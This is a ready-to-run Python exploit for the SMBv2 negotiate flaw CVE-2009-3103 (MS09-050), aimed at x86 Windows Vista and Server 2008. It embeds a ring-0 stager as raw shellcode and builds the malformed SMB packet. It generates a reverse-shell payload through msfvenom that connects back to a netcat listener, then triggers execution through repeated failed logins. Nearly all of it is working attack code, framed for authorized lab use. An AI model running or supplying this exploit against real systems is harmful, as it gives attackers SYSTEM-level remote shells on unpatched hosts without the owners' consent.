#!/usr/bin/env python3
"""
MS09-050 / CVE-2009-3103 - SMBv2 negotiate (srv2.sys) remote code execution -> SYSTEM

Targets : Windows Vista SP1/SP2 and Server 2008 SP1/SP2, x86 only.
          Not Server 2008 R2, not Windows 7 release builds, not x64.
Based on: Rapid7 Metasploit's ms09_050_smb2_negotiate_func_index module and
          the earlier Python proof of concept EDB 40280 (ohnozzy).
Changed : the three lengths that EDB 40280 froze for a 354-byte payload (NetBIOS length,
          SMB ByteCount, copy count inside the kernel stager) are computed from the payload;
          the payload is made by msfvenom at run time (stageless, so plain nc catches it);
          Python 3, standard library only.

Use (one attempt per boot - revert the target before a retry):
    rlwrap nc -lvnp 443                        # terminal 1, first
    python3 ms09_050.py $IP                    # terminal 2: LHOST = tun0 address, LPORT = 443
    python3 ms09_050.py $IP -l $LHOST -p 443
    python3 ms09_050.py $IP --check            # build and print the sizes, send nothing
    python3 ms09_050.py $IP --sc payload.bin   # your own raw x86 shellcode (EXITFUNC=thread)
"""
import argparse
import re
import shutil
import socket
import struct
import subprocess
import sys
import time

# Metasploit "stager_sysenter_hook", 202 bytes. Ring 0: copies itself and the payload to
# 0xffdf0400 and points the SYSENTER handler at the copy. The next system call made by
# lsass.exe returns into the payload; the hook then removes itself.
STAGER = (
    b"\xfc\xfa\xeb\x1e\x5e\x68\x76\x01"
    b"\x00\x00\x59\x0f\x32\x89\x46\x5d"
    b"\x8b\x7e\x61\x89\xf8\x0f\x30\xb9"
    b"\x16\x02\x00\x00\xf3\xa4\xfb\xf4"   # 16 02 00 00 = copy count, overwritten in build_packet
    b"\xeb\xfd\xe8\xdd\xff\xff\xff\x6a"
    b"\x00\x9c\x60\xe8\x00\x00\x00\x00"
    b"\x58\x8b\x58\x54\x89\x5c\x24\x24"
    b"\x81\xf9\xde\xc0\xad\xde\x75\x10"
    b"\x68\x76\x01\x00\x00\x59\x89\xd8"
    b"\x31\xd2\x0f\x30\x31\xc0\xeb\x31"
    b"\x8b\x32\x0f\xb6\x1e\x66\x81\xfb"
    b"\xc3\x00\x75\x25\x8b\x58\x5c\x8d"
    b"\x5b\x69\x89\x1a\xb8\x01\x00\x00"
    b"\x80\x0f\xa2\x81\xe2\x00\x00\x10"
    b"\x00\x74\x0e\xba\x00\xff\x3f\xc0"
    b"\x83\xc2\x04\x81\x22\xff\xff\xff"
    b"\x7f\x61\x9d\xc3\xff\xff\xff\xff"
    b"\x00\x04\xdf\xff\x00\x04\xfe\x7f"
    b"\x60\x6a\x30\x58\x99\x64\x8b\x18"
    b"\x39\x53\x0c\x74\x2b\x8b\x43\x10"
    b"\x8b\x40\x3c\x83\xc0\x28\x8b\x08"
    b"\x03\x48\x03\x81\xf9\x6c\x61\x73"
    b"\x73\x75\x15\xe8\x07\x00\x00\x00"
    b"\xe8\x0d\x00\x00\x00\xeb\x09\xb9"
    b"\xde\xc0\xad\xde\x89\xe2\x0f\x34"
    b"\x61\xc3"
)
STACK_ADJUST = b"\x81\xc4\x54\xf2\xff\xff"     # add esp, -3500 (runs just before the payload)
COPY_COUNT_OFFSET = 24                         # position of the "mov ecx, <count>" operand


def die(msg):
    print(f"[-] {msg}")
    sys.exit(1)


def build_packet(sc):
    """SMB1 negotiate request that srv2.sys mishandles. Every length is computed here."""
    ring3 = STACK_ADJUST + sc
    ring0 = bytearray(STAGER)
    struct.pack_into("<I", ring0, COPY_COUNT_OFFSET, len(ring0) + len(ring3) - 0x1C)

    data = b"\x02" + b"\x04\x0d\xdf\xff" * 25 + b"\x00"   # dialect 1: a readable kernel address, 25 times
    data += b"\x02SMB 2.002\x00"                          # dialect 2: hands the request to srv2.sys
    data += b"\x00\x00\x00\x00" * 37                      # must be zero
    data += b"\xff\xff\xff\xff" * 2
    data += b"\x42\x42\x42\x42" * 7                       # unused
    data += b"\xb4\xff\xff\x3f"                           # magic index
    data += b"\x41\x41\x41\x41" * 6                       # unused
    data += b"\x09\x0d\xd0\xff"                           # return address: pop esi; ret
    data += bytes(ring0) + ring3

    smb = b"\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8"   # SMB1 header, command 0x72 = negotiate
    smb += b"\x17\x02"                                    # ProcessIDHigh = index into the function table (the bug)
    smb += b"\x00\xe9\x58\x01\x00\x00\x00\x00"            # signature field, executed as "jmp" into the stager
    smb += b"\x00\x00\x00\x00\x00\x00\x00\x00\xfe\xda"    # reserved, TID, PID, UID, MID
    smb += b"\x00" + struct.pack("<H", len(data))         # WordCount 0, ByteCount
    smb += data
    return struct.pack(">I", len(smb)) + smb              # NetBIOS session header: length of what follows


def self_check():
    """With a 354-byte payload the three computed fields must equal EDB 40280's fixed bytes."""
    pkt = build_packet(b"\x90" * 354)
    ok = (
        len(STAGER) == 202
        and len(pkt) == 930
        and pkt[0:4] == b"\x00\x00\x03\x9e"       # NetBIOS length 926
        and pkt[37:39] == b"\x7b\x03"             # ByteCount 891
        and pkt[392:396] == b"\x16\x02\x00\x00"   # copy count 534
    )
    if not ok:
        die("layout self-check failed: the script was edited or damaged. Nothing sent.")


def tun0_ip():
    try:
        out = subprocess.run(["ip", "-4", "-o", "addr", "show", "tun0"],
                             capture_output=True, text=True).stdout
    except OSError:
        return None
    m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
    return m.group(1) if m else None


def listener_up(lport):
    """True / False from `ss -ltn`; None when it cannot be told."""
    try:
        out = subprocess.run(["ss", "-ltn"], capture_output=True, text=True).stdout
    except OSError:
        return None
    return re.search(rf":{lport}\s", out) is not None


def make_payload(payload, lhost, lport):
    cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "EXITFUNC=thread",
           "-a", "x86", "--platform", "windows", "-f", "raw"]
    print("[*] " + " ".join(cmd) + "   (takes some seconds)")
    try:
        r = subprocess.run(cmd, capture_output=True)
    except OSError:
        die("msfvenom not found. Make the payload elsewhere and pass it with --sc <file>.")
    if r.returncode != 0 or not r.stdout:
        die("msfvenom failed:\n" + r.stderr.decode(errors="replace"))
    return r.stdout


def poke(rhost):
    """Two failed SMB logins. Any logon makes lsass.exe issue system calls = the trigger."""
    if shutil.which("rpcclient"):
        tool = lambda u: ["rpcclient", "-U", f"{u}%wrongpass", "-c", "getusername", rhost]
    elif shutil.which("smbclient"):
        tool = lambda u: ["smbclient", "-L", f"//{rhost}", "-U", f"{u}%wrongpass"]
    else:
        return False
    for user in ("Guest", "Administrator"):
        try:
            subprocess.run(tool(user), stdin=subprocess.DEVNULL, capture_output=True, timeout=15)
        except (subprocess.TimeoutExpired, OSError):
            pass
    return True


def main():
    ap = argparse.ArgumentParser(
        description="SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497) - x86",
        epilog=(
            "Examples (authorized lab targets only):\n"
            "  python3 ms09_050.py 192.0.2.10 --check -l 192.0.2.20\n"
            "  rlwrap nc -lvnp 443                 # start in another terminal first\n"
            "  python3 ms09_050.py 192.0.2.10 -l 192.0.2.20 -p 443\n"
            "  python3 ms09_050.py 192.0.2.10 --sc payload.bin --check\n\n"
            "The default callback address is read from tun0. A normal run generates raw\n"
            "x86 shellcode with msfvenom. --check builds the packet without sending it;\n"
            "it still runs msfvenom unless --sc supplies a raw payload file.\n"
            "The exploit may crash a vulnerable VM. Revert it before retrying."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("rhost", metavar="TARGET", help="authorized target IP or hostname (SMB port 445)")
    ap.add_argument("-l", "--lhost", metavar="IP", help="callback IP (default: tun0 IPv4 address)")
    ap.add_argument("-p", "--lport", type=int, default=443, metavar="PORT",
                    help="callback port (default: 443)")
    ap.add_argument("--payload", default="windows/shell_reverse_tcp",
                    help="msfvenom payload, x86. Stageless (one slash after 'windows') for nc.")
    ap.add_argument("--sc", metavar="FILE", help="read raw x86 shellcode instead of running msfvenom")
    ap.add_argument("--check", action="store_true", help="build the packet, print sizes, send nothing")
    ap.add_argument("--wait", type=int, default=180, help="seconds to keep poking (default 180)")
    ap.add_argument("--force", action="store_true", help="send even if no listener is seen")
    args = ap.parse_args()

    self_check()

    if args.sc:
        with open(args.sc, "rb") as f:
            sc = f.read()
        print(f"[*] payload: {args.sc}")
    else:
        lhost = args.lhost or tun0_ip()
        if not lhost:
            die("no address on tun0 - give the callback address with -l")
        if args.payload.count("/") > 1:
            print(f"[!] {args.payload} is a STAGED payload: nc will show a connection and nothing "
                  "else. It needs multi/handler.")
        if "reverse" in args.payload and not args.check and not args.force:
            if listener_up(args.lport) is False:
                die(f"nothing listens on port {args.lport}. Start `rlwrap nc -lvnp {args.lport}` "
                    "first (the payload fires once), or pass --force.")
        print(f"[*] callback: {lhost}:{args.lport}")
        sc = make_payload(args.payload, lhost, args.lport)

    if not sc:
        die("empty payload")
    if len(sc) > 1024:
        print(f"[!] payload is {len(sc)} bytes; the Metasploit module allows 1024. May not work.")

    pkt = build_packet(sc)
    print(f"[*] payload {len(sc)} bytes, packet {len(pkt)} bytes "
          f"(NetBIOS length {len(pkt) - 4}, ByteCount {len(pkt) - 39}, "
          f"copy count {len(STAGER) + len(STACK_ADJUST) + len(sc) - 0x1C})")
    if args.check:
        print("[*] --check: nothing sent")
        return

    try:
        s = socket.create_connection((args.rhost, 445), timeout=10)
    except OSError as e:
        die(f"cannot connect to {args.rhost}:445 ({e}). Target down or still rebooting?")
    s.sendall(pkt)
    print(f"[+] exploit packet sent to {args.rhost}:445")
    print(f"[*] poking lsass with failed logins for up to {args.wait} s. "
          "Watch the listener; Ctrl-C here once the shell is there.")

    start = time.monotonic()
    try:
        time.sleep(2)
        while time.monotonic() - start < args.wait:
            if not poke(args.rhost):
                print(f"[!] no rpcclient / smbclient: make a login attempt yourself, "
                      f"e.g. `nxc smb {args.rhost} -u a -p a`")
            time.sleep(20)
            print(f"    {int(time.monotonic() - start)} s")
    except KeyboardInterrupt:
        print()
    finally:
        s.close()
    print("[*] done. No shell? Revert the target before any retry - one attempt per boot.")


if __name__ == "__main__":
    main()
